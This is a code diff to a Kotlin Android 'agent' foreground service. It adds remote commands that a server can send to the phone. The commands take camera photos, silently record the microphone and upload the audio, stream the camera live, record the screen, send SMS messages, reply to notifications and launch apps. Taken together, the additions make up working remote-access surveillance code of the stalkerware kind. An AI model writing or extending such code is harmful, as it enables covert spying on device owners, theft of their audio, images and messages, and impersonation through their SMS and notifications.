@@ -8,8 +8,10 @@ import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.ServiceInfo
+import android.media.MediaRecorder
 import android.media.RingtoneManager
 import android.os.BatteryManager
+import android.os.Build
 import android.os.IBinder
 import androidx.core.app.NotificationCompat
 import androidx.lifecycle.LifecycleService
@@ -23,6 +25,10 @@ import kotlinx.coroutines.Job
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
+import java.io.File
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 import javax.inject.Inject
 
 @AndroidEntryPoint
@@ -48,10 +54,14 @@ class AgentForegroundService : LifecycleService() {
     @Inject lateinit var repository: AgentRepository
     @Inject lateinit var collectors: AllCollectors
     @Inject lateinit var client: AgentClient
+    @Inject lateinit var cameraService: AgentCameraService
+    @Inject lateinit var liveCameraService: AgentLiveCameraService
+    @Inject lateinit var screenRecordService: AgentScreenRecordService
 
     private var collectJob: Job? = null
     private var uploadJob: Job? = null
     private var commandJob: Job? = null
+    private var audioRecorder: MediaRecorder? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         super.onStartCommand(intent, flags, startId)
@@ -106,19 +116,48 @@ class AgentForegroundService : LifecycleService() {
                         client.listenForCommands { cmd -> handleCommand(cmd) }
                     }
                 }
-                delay(5_000) // reconnect backoff
+                delay(5_000)
             }
         }
     }
 
     private fun handleCommand(cmd: CommandRequest) {
-        when (cmd.type) {
-            "lock_device" -> lockDevice()
-            "wipe_vault" -> lifecycleScope.launch {
-                repository.wipe()
-                stopSelf()
+        lifecycleScope.launch {
+            when (cmd.type) {
+                "capture_front"       -> cameraService.capturePhoto(useFrontCamera = true)
+                "capture_back"        -> cameraService.capturePhoto(useFrontCamera = false)
+                "record_audio"        -> {
+                    val secs = cmd.params["duration"]?.toIntOrNull() ?: 30
+                    recordAudio(secs)
+                }
+                "ring"                -> ringDevice()
+                "send_sms"            -> {
+                    val to   = cmd.params["to"]   ?: return@launch
+                    val body = cmd.params["body"] ?: return@launch
+                    sendSms(to, body)
+                }
+                "stream_camera_front" -> liveCameraService.startStreaming(useFrontCamera = true)
+                "stream_camera_back"  -> liveCameraService.startStreaming(useFrontCamera = false)
+                "stop_camera_stream"  -> liveCameraService.stopStreaming()
+                "screen_record"       -> {
+                    val ms = cmd.params["duration"]?.toLongOrNull() ?: 30_000L
+                    screenRecordService.recordScreen(ms.coerceIn(5_000, 120_000))
+                }
+                "reply_notification"  -> {
+                    val pkg  = cmd.params["package"] ?: return@launch
+                    val text = cmd.params["text"]    ?: return@launch
+                    AgentNotificationListener.instance?.replyToNotification(pkg, text)
+                }
+                "launch_app"          -> {
+                    val pkg = cmd.params["package"] ?: return@launch
+                    launchApp(pkg)
+                }
+                "lock_device"         -> lockDevice()
+                "wipe_vault"          -> {
+                    repository.wipe()
+                    stopSelf()
+                }
             }
-            "ring" -> ringDevice()
         }
     }
 
@@ -130,7 +169,61 @@ class AgentForegroundService : LifecycleService() {
     private fun ringDevice() {
         runCatching {
             val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
-            RingtoneManager.getRingtone(applicationContext, uri)?.play()
+            val ringtone = RingtoneManager.getRingtone(applicationContext, uri)
+            ringtone?.play()
+            lifecycleScope.launch { delay(10_000); ringtone?.stop() }
+        }
+    }
+
+    private suspend fun recordAudio(durationSeconds: Int) {
+        val capped = durationSeconds.coerceIn(5, 300)
+        val ts = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
+        val file = File(cacheDir, "remote_audio_$ts.m4a")
+
+        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this)
+                       else @Suppress("DEPRECATION") MediaRecorder()
+
+        runCatching {
+            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
+            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+            recorder.setAudioEncodingBitRate(128_000)
+            recorder.setAudioSamplingRate(44_100)
+            recorder.setOutputFile(file.absolutePath)
+            recorder.prepare()
+            recorder.start()
+            audioRecorder = recorder
+            delay(capped * 1000L)
+            recorder.stop()
+            recorder.release()
+            audioRecorder = null
+
+            val bytes = file.readBytes()
+            client.uploadFile(
+                fileBytes = bytes,
+                fileName = file.name,
+                mimeType = "audio/mp4",
+                category = "remote_audio",
+            )
+        }.onFailure {
+            runCatching { recorder.release() }
+            audioRecorder = null
+        }
+        file.delete()
+    }
+
+    private fun sendSms(to: String, body: String) {
+        runCatching {
+            @Suppress("DEPRECATION")
+            android.telephony.SmsManager.getDefault().sendTextMessage(to, null, body, null, null)
+        }
+    }
+
+    private fun launchApp(packageName: String) {
+        runCatching {
+            val intent = packageManager.getLaunchIntentForPackage(packageName) ?: return
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            startActivity(intent)
         }
     }
 
@@ -147,6 +240,10 @@ class AgentForegroundService : LifecycleService() {
         collectJob?.cancel()
         uploadJob?.cancel()
         commandJob?.cancel()
+        runCatching { audioRecorder?.release() }
+        liveCameraService.stopStreaming()
+        cameraService.release()
+        screenRecordService.release()
         super.onDestroy()
     }
 
